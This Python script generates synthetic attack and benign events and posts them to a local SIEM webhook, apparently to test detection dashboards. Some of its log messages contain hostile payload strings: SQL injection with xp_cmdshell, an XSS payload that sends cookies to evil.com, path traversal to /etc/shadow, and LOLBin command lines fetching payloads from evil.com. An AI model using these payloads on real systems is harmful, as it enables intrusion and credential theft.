"""
inject_rich_data.py — Inject diverse, realistic security events into Sentinel.

Covers attack categories:
  1. SSH Brute Force (many IPs, many users)
  2. Web Application Attacks (SQLi, XSS, Path traversal)
  3. Ransomware / Malware (suspicious process, file encryption)
  4. Privilege Escalation (sudo abuse, token theft)
  5. Lateral Movement (RDP, PsExec, WMI)
  6. Data Exfiltration (large outbound, DNS tunneling)
  7. C2 Beaconing (periodic outbound to known bad IPs)
  8. Credential Dumping (LSASS access, SAM dump)
  9. Network Recon (port scans, ICMP sweep)
 10. Cloud / IAM abuse (API key leak, overprivileged call)
 11. Normal / benign events (for mix)
"""

import random
import time
import datetime
import requests

WEBHOOK_URL = "http://localhost:8000/ingest/webhook/local-webhook"
TOKEN = "test-token"
HEADERS = {
    "Authorization": f"Bearer {TOKEN}",
    "Content-Type": "application/json",
}

NOW = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None)


def ts(minutes_ago: float) -> str:
    """Return ISO timestamp shifted by minutes_ago into the past."""
    t = NOW - datetime.timedelta(minutes=minutes_ago)
    return t.strftime("%Y-%m-%dT%H:%M:%S.") + f"{random.randint(0, 999999):06d}Z"


# ─── Event Templates ─────────────────────────────────────────────────────────

def ssh_brute(src_ip: str, user: str, host: str, port: int, minutes_ago: float):
    return {
        "@timestamp": ts(minutes_ago),
        "event_category": "authentication",
        "event_action": "ssh_login",
        "event_outcome": "failure",
        "event_severity": 40,
        "host_name": host,
        "source_ip": src_ip,
        "user_name": user,
        "message": f"Failed password for invalid user {user} from {src_ip} port {port} ssh2",
    }


def ssh_success(src_ip: str, user: str, host: str, minutes_ago: float):
    return {
        "@timestamp": ts(minutes_ago),
        "event_category": "authentication",
        "event_action": "ssh_login",
        "event_outcome": "success",
        "event_severity": 20,
        "host_name": host,
        "source_ip": src_ip,
        "user_name": user,
        "message": f"Accepted publickey for {user} from {src_ip} port {random.randint(40000,60000)} ssh2",
    }


def web_sqli(src_ip: str, host: str, path: str, minutes_ago: float):
    payloads = [
        "' OR 1=1--", "'; DROP TABLE users;--", "' UNION SELECT * FROM admin--",
        "admin'--", "1=1 OR 'a'='a", "'; EXEC xp_cmdshell('cmd')--",
    ]
    payload = random.choice(payloads)
    return {
        "@timestamp": ts(minutes_ago),
        "event_category": "web",
        "event_action": "http_request",
        "event_outcome": "failure",
        "event_severity": 60,
        "host_name": host,
        "source_ip": src_ip,
        "user_name": "",
        "message": f"WAF BLOCK: SQL injection attempt on {path}?id={payload} from {src_ip}",
        "file_path": path,
    }


def web_xss(src_ip: str, host: str, minutes_ago: float):
    payloads = [
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=fetch('http://evil.com/'+btoa(document.cookie))>",
        "javascript:eval(atob('YWxlcnQoMSk='))",
    ]
    payload = random.choice(payloads)
    return {
        "@timestamp": ts(minutes_ago),
        "event_category": "web",
        "event_action": "http_request",
        "event_outcome": "failure",
        "event_severity": 50,
        "host_name": host,
        "source_ip": src_ip,
        "user_name": "",
        "message": f"WAF BLOCK: XSS payload detected in request body: {payload[:60]}",
    }


def web_path_traversal(src_ip: str, host: str, minutes_ago: float):
    paths = [
        "/../../../etc/passwd", "/../../../etc/shadow", "/..%2F..%2F..%2Fetc%2Fhosts",
        "/%2e%2e/%2e%2e/etc/passwd", "/../../../../windows/system32/drivers/etc/hosts",
    ]
    path = random.choice(paths)
    return {
        "@timestamp": ts(minutes_ago),
        "event_category": "web",
        "event_action": "http_request",
        "event_outcome": "failure",
        "event_severity": 55,
        "host_name": host,
        "source_ip": src_ip,
        "message": f"WAF BLOCK: Path traversal attempt: GET /api{path}",
        "file_path": path,
    }


def malware_process(host: str, user: str, minutes_ago: float):
    bad_procs = [
        ("mimikatz.exe", "C:\\Users\\Public\\mimikatz.exe --dump"),
        ("mshta.exe", "mshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run(\"\"powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcA\"\")\")(window.close)"),
        ("wscript.exe", "wscript.exe //B //NoLogo C:\\Windows\\Temp\\loader.vbs"),
        ("powershell.exe", "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA=="),
        ("certutil.exe", "certutil.exe -decode C:\\Windows\\Temp\\payload.b64 C:\\Windows\\Temp\\payload.exe"),
        ("regsvr32.exe", "regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll"),
        ("rundll32.exe", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write()"),
    ]
    proc_name, cmd = random.choice(bad_procs)
    return {
        "@timestamp": ts(minutes_ago),
        "event_category": "process",
        "event_action": "process_start",
        "event_outcome": "success",
        "event_severity": 80,
        "host_name": host,
        "source_ip": "",
        "user_name": user,
        "process_name": proc_name,
        "process_command_line": cmd,
        "message": f"Suspicious process started: {proc_name} by {user}",
    }


def ransomware_file(host: str, user: str, minutes_ago: float):
    exts = [".encrypted", ".locked", ".WNCRY", ".crypt", ".zepto", ".locky"]
    ext = random.choice(exts)
    dirs = [
        "C:\\Users\\Documents\\", "C:\\Users\\Desktop\\", "D:\\Shares\\Finance\\",
        "D:\\Shares\\HR\\", "\\\\fileserver\\share\\",
    ]
    dirname = random.choice(dirs)
    return {
        "@timestamp": ts(minutes_ago),
        "event_category": "file",
        "event_action": "file_rename",
        "event_outcome": "success",
        "event_severity": 90,
        "host_name": host,
        "source_ip": "",
        "user_name": user,
        "file_path": f"{dirname}document_{random.randint(1000,9999)}{ext}",
        "message": f"Mass file rename detected: {dirname}* -> *{ext} - possible ransomware activity",
    }


def priv_escalation(host: str, src_ip: str, user: str, minutes_ago: float):
    methods = [
        (f"sudo su - root executed by {user}", 75),
        (f"SUID binary abuse: {user} ran /usr/bin/pkexec", 70),
        (f"Token impersonation: {user} duplicated SYSTEM token", 80),
        (f"Scheduled task created with SYSTEM privileges by {user}", 65),
        (f"DLL hijack in C:\\Windows\\System32 by {user}", 85),
    ]
    msg, sev = random.choice(methods)
    return {
        "@timestamp": ts(minutes_ago),
        "event_category": "privilege_escalation",
        "event_action": "privilege_change",
        "event_outcome": "success",
        "event_severity": sev,
        "host_name": host,
        "source_ip": src_ip,
        "user_name": user,
        "message": msg,
    }


def lateral_movement(src_host: str, dst_host: str, src_ip: str, dst_ip: str, user: str, proto: str, minutes_ago: float):
    return {
        "@timestamp": ts(minutes_ago),
        "event_category": "lateral_movement",
        "event_action": proto.lower() + "_connect",
        "event_outcome": "success",
        "event_severity": 70,
        "host_name": src_host,
        "source_ip": src_ip,
        "destination_ip": dst_ip,
        "user_name": user,
        "network_protocol": proto,
        "message": f"Lateral movement: {user} connected from {src_host}({src_ip}) to {dst_host}({dst_ip}) via {proto}",
    }


def data_exfil(src_host: str, src_ip: str, dst_ip: str, bytes_out: int, minutes_ago: float):
    return {
        "@timestamp": ts(minutes_ago),
        "event_category": "network",
        "event_action": "data_transfer",
        "event_outcome": "success",
        "event_severity": 75,
        "host_name": src_host,
        "source_ip": src_ip,
        "destination_ip": dst_ip,
        "network_bytes": bytes_out,
        "network_protocol": "HTTPS",
        "message": f"Large outbound transfer: {bytes_out // (1024*1024)}MB sent from {src_ip} to external {dst_ip}",
    }


def dns_tunnel(host: str, src_ip: str, minutes_ago: float):
    domains = [
        "aGVsbG8ud29ybGQ.evil-c2.net",
        "dXNlcm5hbWU6cGFzc3dvcmQ.exfil.xyz",
        "c3lzdGVtaW5mby5leGU.c2server.cc",
        "bG9jYWwuaGlzdG9yeQ.tunnel.pw",
    ]
    domain = random.choice(domains)
    return {
        "@timestamp": ts(minutes_ago),
        "event_category": "dns",
        "event_action": "dns_query",
        "event_outcome": "success",
        "event_severity": 65,
        "host_name": host,
        "source_ip": src_ip,
        "destination_ip": "8.8.8.8",
        "message": f"Suspicious DNS TXT query — possible tunneling: {domain}",
    }


def c2_beacon(host: str, src_ip: str, dst_ip: str, minutes_ago: float):
    return {
        "@timestamp": ts(minutes_ago),
        "event_category": "network",
        "event_action": "c2_beacon",
        "event_outcome": "success",
        "event_severity": 85,
        "host_name": host,
        "source_ip": src_ip,
        "destination_ip": dst_ip,
        "network_protocol": "HTTPS",
        "network_bytes": random.randint(256, 4096),
        "message": f"C2 beacon detected: {src_ip} -> known malicious {dst_ip} (Cobalt Strike fingerprint)",
    }


def cred_dump(host: str, user: str, minutes_ago: float):
    methods = [
        "LSASS memory read detected (PID 4): possible credential dumping",
        "SAM database accessed by non-SYSTEM process",
        "NTDS.dit file accessed outside scheduled backup window",
        "Kerberoasting: SPN enumeration from non-admin account",
        "DCSync: replication request from non-DC host",
    ]
    return {
        "@timestamp": ts(minutes_ago),
        "event_category": "credential_access",
        "event_action": "credential_dump",
        "event_outcome": "success",
        "event_severity": 90,
        "host_name": host,
        "source_ip": "",
        "user_name": user,
        "process_name": "lsass.exe",
        "message": random.choice(methods),
    }


def port_scan(src_ip: str, dst_host: str, dst_ip: str, minutes_ago: float):
    return {
        "@timestamp": ts(minutes_ago),
        "event_category": "network",
        "event_action": "port_scan",
        "event_outcome": "success",
        "event_severity": 50,
        "host_name": dst_host,
        "source_ip": src_ip,
        "destination_ip": dst_ip,
        "network_protocol": "TCP",
        "message": f"Port scan detected: {src_ip} scanned {dst_ip} ({random.randint(100,65535)} ports in 30s)",
    }


def iam_abuse(host: str, user: str, src_ip: str, minutes_ago: float):
    actions = [
        "CreateUser with AdministratorAccess policy attached",
        "AssumeRole to OrganizationAccountAccessRole from unauthorized IP",
        "PutBucketPolicy granting public s3:GetObject on sensitive bucket",
        "CreateAccessKey for root account",
        "ModifyInstanceAttribute: disableApiTermination=false on production DB",
        "AuthorizeSecurityGroupIngress: 0.0.0.0/0:22 on prod-sg",
    ]
    return {
        "@timestamp": ts(minutes_ago),
        "event_category": "iam",
        "event_action": "api_call",
        "event_outcome": "success",
        "event_severity": 70,
        "host_name": host,
        "source_ip": src_ip,
        "user_name": user,
        "message": f"Suspicious IAM action by {user} from {src_ip}: {random.choice(actions)}",
    }


def normal_event(host: str, user: str, minutes_ago: float):
    events = [
        ("authentication", "ssh_login", "success", 20,
         f"Accepted publickey for {user} from 10.0.0.1"),
        ("process", "process_start", "success", 10,
         f"Normal process: nginx worker started on {host}"),
        ("network", "http_request", "success", 10,
         f"GET /api/v1/health 200 OK from 10.0.1.5"),
        ("file", "file_read", "success", 5,
         f"Routine backup read: /var/log/syslog"),
        ("authentication", "user_logout", "success", 10,
         f"User {user} logged out from {host}"),
    ]
    cat, action, outcome, sev, msg = random.choice(events)
    return {
        "@timestamp": ts(minutes_ago),
        "event_category": cat,
        "event_action": action,
        "event_outcome": outcome,
        "event_severity": sev,
        "host_name": host,
        "source_ip": "10.0.0." + str(random.randint(1, 50)),
        "user_name": user,
        "message": msg,
    }


# ─── Scenario Data ────────────────────────────────────────────────────────────

INTERNAL_HOSTS = [
    ("production-db-01", "10.10.1.10"),
    ("web-server-prod", "10.10.1.20"),
    ("web-server-02", "10.10.1.21"),
    ("api-gateway", "10.10.1.30"),
    ("fileserver-01", "10.10.2.10"),
    ("dc-01", "10.10.2.20"),
    ("workstation-alice", "10.10.3.11"),
    ("workstation-bob", "10.10.3.12"),
    ("workstation-charlie", "10.10.3.13"),
    ("jenkins-ci", "10.10.4.10"),
    ("elk-stack", "10.10.4.20"),
    ("k8s-master", "10.10.5.10"),
]

USERS = ["alice", "bob", "charlie", "dave", "sysadmin", "deploy", "jenkins", "root", "Administrator", "guest"]

ATTACKER_IPS = [
    "185.220.101.45",   # TOR exit
    "194.165.16.11",    # Known malicious RU
    "45.95.168.90",     # Scanner
    "103.235.46.39",    # APT-related CN
    "91.108.56.130",    # VPN pivot
    "162.247.74.200",   # TOR exit node
    "198.54.117.200",   # Known C2
    "37.49.225.219",    # Botnet node
]

C2_IPS = [
    "198.54.117.200",
    "185.196.220.43",
    "91.243.33.55",
    "103.125.191.11",
]


def send_event(event: dict, idx: int, total: int):
    try:
        resp = requests.post(WEBHOOK_URL, json=event, headers=HEADERS, timeout=5)
        if resp.status_code == 202:
            print(f"  [{idx:>3}/{total}] OK   {event['event_category']:20s} | {event['host_name']:20s} | {event['message'][:70]}")
        else:
            print(f"  [{idx:>3}/{total}] ERR  HTTP {resp.status_code}: {resp.text[:100]}")
    except Exception as ex:
        print(f"  [{idx:>3}/{total}] FAIL Error: {ex}")
    time.sleep(0.08)  # rate-limit respect


def build_events() -> list:
    events = []

    # ── 1. SSH Brute Force campaigns (concentrated bursts) ──
    brute_hosts = [h for h, _ in INTERNAL_HOSTS[:4]]
    brute_users = ["root", "admin", "oracle", "postgres", "ubuntu"]
    
    # Campaign A: IP 185.220.101.45 brute forces production-db-01
    for i in range(8):
        events.append(ssh_brute("185.220.101.45", random.choice(brute_users), "production-db-01", random.randint(40000, 65535), 2.0 - (i * 0.1)))
    # Success attempt after brute force
    events.append(ssh_success("185.220.101.45", "root", "production-db-01", 1.0))

    # Campaign B: IP 194.165.16.11 brute forces dc-01
    for i in range(8):
        events.append(ssh_brute("194.165.16.11", random.choice(brute_users), "dc-01", random.randint(40000, 65535), 3.0 - (i * 0.1)))
    # Success attempt
    events.append(ssh_success("194.165.16.11", "Administrator", "dc-01", 2.0))

    # Campaign C: IP 45.95.168.90 brute forces web-server-prod
    for i in range(8):
        events.append(ssh_brute("45.95.168.90", random.choice(brute_users), "web-server-prod", random.randint(40000, 65535), 4.0 - (i * 0.1)))

    # ── 2. Web Application Attacks (concentrated bursts) ──
    web_hosts = ["web-server-prod", "web-server-02", "api-gateway"]
    # SQLi attack burst from 185.220.101.45 (5 attempts in 1 min)
    for i in range(5):
        events.append(web_sqli("185.220.101.45", "web-server-prod", "/login", 2.5 - (i * 0.1)))
    # XSS attack burst from 103.235.46.39 (5 attempts in 1 min)
    for i in range(5):
        events.append(web_xss("103.235.46.39", "api-gateway", 3.5 - (i * 0.1)))
    # Path traversal burst from 37.49.225.219 (5 attempts in 1 min)
    for i in range(5):
        events.append(web_path_traversal("37.49.225.219", "web-server-02", 4.5 - (i * 0.1)))

    # ── 3. Malware / Suspicious Processes ──
    mal_hosts = ["workstation-alice", "workstation-bob", "jenkins-ci"]
    for i in range(10):
        host = random.choice(mal_hosts)
        user = random.choice(["alice", "bob", "SYSTEM", "Administrator"])
        events.append(malware_process(host, user, random.uniform(1.0, 5.0)))

    # ── 4. Ransomware File Activity ──
    # Concentrated burst of renames on workstation-bob (12 events in 1 min)
    for i in range(12):
        events.append(ransomware_file("workstation-bob", "bob", 2.0 - (i * 0.05)))

    # ── 5. Privilege Escalation ──
    events.append(priv_escalation("production-db-01", "10.10.1.10", "bob", 1.5))
    events.append(priv_escalation("dc-01", "10.10.2.20", "charlie", 2.5))
    events.append(priv_escalation("workstation-alice", "10.10.3.11", "alice", 3.5))

    # ── 6. Lateral Movement (concentrated) ──
    # Multiple lateral movements from bob's workstation to DC and servers
    events.append(lateral_movement("workstation-bob", "dc-01", "10.10.3.12", "10.10.2.20", "bob", "RDP", 2.0))
    events.append(lateral_movement("workstation-bob", "fileserver-01", "10.10.3.12", "10.10.2.10", "bob", "SMB", 2.2))
    events.append(lateral_movement("workstation-bob", "production-db-01", "10.10.3.12", "10.10.1.10", "bob", "WMI", 2.4))

    # ── 7. Data Exfiltration ──
    events.append(data_exfil("production-db-01", "10.10.1.10", "185.220.101.45", 550 * 1024 * 1024, 3.0))
    events.append(data_exfil("web-server-prod", "10.10.1.20", "194.165.16.11", 620 * 1024 * 1024, 3.2))

    # ── 8. DNS Tunneling ──
    for i in range(5):
        events.append(dns_tunnel("workstation-alice", "10.10.3.11", 2.5 - (i * 0.1)))

    # ── 9. C2 Beaconing ──
    for i in range(15):
        events.append(c2_beacon("workstation-bob", "10.10.3.12", "198.54.117.200", 4.0 - (i * 0.2)))

    # ── 10. Credential Dumping ──
    events.append(cred_dump("dc-01", "SYSTEM", 1.8))
    events.append(cred_dump("production-db-01", "Administrator", 2.8))

    # ── 11. Port Scanning / Recon ──
    # Concentrated scan of dc-01 from attacker IP 37.49.225.219 (3 events)
    events.append(port_scan("37.49.225.219", "dc-01", "10.10.2.20", 2.0))
    events.append(port_scan("37.49.225.219", "production-db-01", "10.10.1.10", 2.2))
    events.append(port_scan("37.49.225.219", "workstation-bob", "10.10.3.12", 2.4))

    # ── 12. IAM / Cloud Abuse ──
    events.append(iam_abuse("dc-01", "deploy", "37.49.225.219", 1.5))
    events.append(iam_abuse("k8s-master", "bob", "91.108.56.130", 2.5))
    events.append(iam_abuse("web-server-prod", "alice", "45.95.168.90", 3.5))

    # ── 13. Normal / benign events ──
    for i in range(50):
        host_name, _ = random.choice(INTERNAL_HOSTS)
        user = random.choice(USERS)
        events.append(normal_event(host_name, user, random.uniform(1.0, 240.0)))

    # ── Sort by timestamp descending (newest first) ──
    events.sort(key=lambda e: e["@timestamp"], reverse=True)
    return events


# ─── Main ─────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=" * 80)
    print("  Sentinel Rich Data Injector")
    print("  Target:", WEBHOOK_URL)
    print("=" * 80)

    events = build_events()
    total = len(events)
    print(f"\n[*] Generated {total} diverse security events across 13 attack categories\n")

    for idx, event in enumerate(events, 1):
        send_event(event, idx, total)

    print("\n" + "=" * 80)
    print(f"[OK] Done! Injected {total} events.")
    print("   -> Check the Dashboard at http://localhost:3000/dashboard")
    print("   -> Check Alerts at http://localhost:3000/alerts")
    print("   -> Explore logs at http://localhost:3000/explore")
    print("=" * 80)
